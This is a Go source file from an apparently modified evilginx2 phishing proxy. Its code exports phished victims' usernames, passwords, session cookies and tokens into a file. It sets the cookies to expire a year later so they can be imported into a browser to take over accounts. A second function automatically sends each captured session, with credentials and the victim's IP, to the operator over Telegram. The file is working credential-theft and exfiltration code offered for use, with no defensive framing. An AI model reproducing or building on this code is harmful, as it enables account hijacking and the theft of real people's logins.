package core

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type SessionExport struct {
	SessionInfo SessionInfo       `json:"session_info"`
	Credentials Credentials       `json:"credentials"`
	Tokens      TokenData         `json:"tokens"`
	Cookies     []ExportedCookie  `json:"cookies"`
	Metadata    map[string]string `json:"metadata,omitempty"`
}

type SessionInfo struct {
	ID         int    `json:"id"`
	Phishlet   string `json:"phishlet"`
	LandingURL string `json:"landing_url"`
	UserAgent  string `json:"user_agent"`
	RemoteIP   string `json:"remote_ip"`
	CreateTime string `json:"create_time"`
	UpdateTime string `json:"update_time"`
}

type Credentials struct {
	Username string            `json:"username"`
	Password string            `json:"password"`
	Custom   map[string]string `json:"custom,omitempty"`
}

type TokenData struct {
	CookieTokens map[string]map[string]*database.CookieToken `json:"cookie_tokens,omitempty"`
	BodyTokens   map[string]string                           `json:"body_tokens,omitempty"`
	HttpTokens   map[string]string                           `json:"http_tokens,omitempty"`
}

type ExportedCookie struct {
	Path           string `json:"path"`
	Domain         string `json:"domain"`
	ExpirationDate int64  `json:"expirationDate"`
	Value          string `json:"value"`
	Name           string `json:"name"`
	HttpOnly       bool   `json:"httpOnly"`
	HostOnly       bool   `json:"hostOnly"`
	Secure         bool   `json:"secure"`
	Session        bool   `json:"session"`
}

func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string, error) {
	exportDir := filepath.Join(os.TempDir(), "evilginx_exports")
	if err := os.MkdirAll(exportDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create export directory: %v", err)
	}

	timestamp := time.Now()
	filename := filepath.Join(exportDir, fmt.Sprintf("session_%d_%s.txt", sessionID, timestamp.Format("20060102_150405")))

	export := SessionExport{
		SessionInfo: SessionInfo{
			ID:         sessionID,
			Phishlet:   session.Name,
			LandingURL: "",
			UserAgent:  session.UserAgent,
			RemoteIP:   session.RemoteAddr,
			CreateTime: timestamp.Format("2006-01-02 15:04:05 MST"),
			UpdateTime: timestamp.Format("2006-01-02 15:04:05 MST"),
		},
		Credentials: Credentials{
			Username: session.Username,
			Password: session.Password,
			Custom:   session.Custom,
		},
		Tokens: TokenData{
			CookieTokens: session.CookieTokens,
			BodyTokens:   session.BodyTokens,
			HttpTokens:   session.HttpTokens,
		},
		Metadata: map[string]string{
			"evilginx_version": "3.3.0",
			"export_format":    "json",
			"export_time":      timestamp.Format(time.RFC3339),
		},
	}

	var cookies []ExportedCookie
	for domain, tokens := range session.CookieTokens {
		for name, token := range tokens {
			cookie := ExportedCookie{
				Path:           token.Path,
				Domain:         domain,
				ExpirationDate: timestamp.Add(365 * 24 * time.Hour).Unix(),
				Value:          token.Value,
				Name:           name,
				HttpOnly:       token.HttpOnly,
				HostOnly:       !startsWithDot(domain),
				Secure:         token.Secure,
				Session:        false,
			}
			if cookie.Path == "" {
				cookie.Path = "/"
			}
			cookies = append(cookies, cookie)
		}
	}
	export.Cookies = cookies

	cookiesOnlyJSON, _ := json.Marshal(export.Cookies)

	file, err := os.Create(filename)
	if err != nil {
		return "", fmt.Errorf("failed to create export file: %v", err)
	}
	defer file.Close()

	fmt.Fprintf(file, " id           : %d\n\n", sessionID)
	fmt.Fprintf(file, "\n\n")
	fmt.Fprintf(file, "domain     : %s\n\n", session.Name)
	fmt.Fprintf(file, " username     : %s\n\n", session.Username)
	fmt.Fprintf(file, " password     : %s\n\n", session.Password)
	fmt.Fprintf(file, " user-agent   : %s\n\n", session.UserAgent)
	fmt.Fprintf(file, "\n\n")
	fmt.Fprintf(file, "(\n\n")
	fmt.Fprintf(file, "\n\n")
	fmt.Fprintf(file, "[ cookies ]\n\n")
	fmt.Fprintf(file, "%s", string(cookiesOnlyJSON))
	fmt.Fprintf(file, "\n\n")
	fmt.Fprintf(file, "(use StorageAce extension to import the cookies: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo\n\n")
	fmt.Fprintf(file, "\n\n")

	log.Success("[%d] session exported to JSON: %s", sessionID, filename)
	return filename, nil
}

// STAGE 3 – only send when we have real credentials or enough cookies
func (p *HttpProxy) AutoExportAndSendSession(sessionID int, sid string) {
	if !p.telegram.IsEnabled() {
		return
	}

	session, ok := p.sessions[sid]
	if !ok {
		log.Error("[%d] session not found for auto-export: %s", sessionID, sid)
		return
	}

	totalCookieCount := 0
	for _, tokens := range session.CookieTokens {
		totalCookieCount += len(tokens)
	}

	hasCredentials := session.Username != "" && session.Password != ""
	hasEnoughCookies := totalCookieCount >= 3

	shouldExport := (session.IsDone && hasCredentials) || hasEnoughCookies || (hasCredentials && totalCookieCount > 0)

	log.Important("[%d] Stage-3 check → IsDone=%v creds=%v cookies=%d shouldExport=%v alreadyExported=%v",
		sessionID, session.IsDone, hasCredentials, totalCookieCount, shouldExport, session.TelegramExported)

	if !shouldExport {
		log.Debug("[%d] waiting for meaningful data before export", sessionID)
		return
	}

	// Allow a second send if an earlier empty export happened
	if session.TelegramExported && !hasCredentials {
		log.Debug("[%d] already exported empty version, waiting for credentials", sessionID)
		return
	}

	filename, err := p.ExportSessionToJSON(session, sessionID)
	if err != nil {
		log.Error("[%d] failed to export session: %v", sessionID, err)
		return
	}

	domain := ""
	if pl, err := p.cfg.GetPhishlet(session.Name); err == nil && pl != nil {
		domain = pl.GetLandingPhishHost()
	}

	log.Important("[%d] >>> STAGE 3 SENDING DOCUMENT (creds=%v cookies=%d)", sessionID, hasCredentials, totalCookieCount)

	p.telegram.SendSessionFile(
		sessionID,
		filename,
		session.Username,
		session.Password,
		session.RemoteAddr,
		domain,
		session.Name,
	)

	if hasCredentials || hasEnoughCookies {
		if s, ok := p.sessions[sid]; ok {
			s.TelegramExported = true
		}
	}

	log.Success("[%d] Stage-3 document queued (creds=%v cookies=%d)", sessionID, hasCredentials, totalCookieCount)
}

func startsWithDot(s string) bool {
	return len(s) > 0 && s[0] == '.'
}
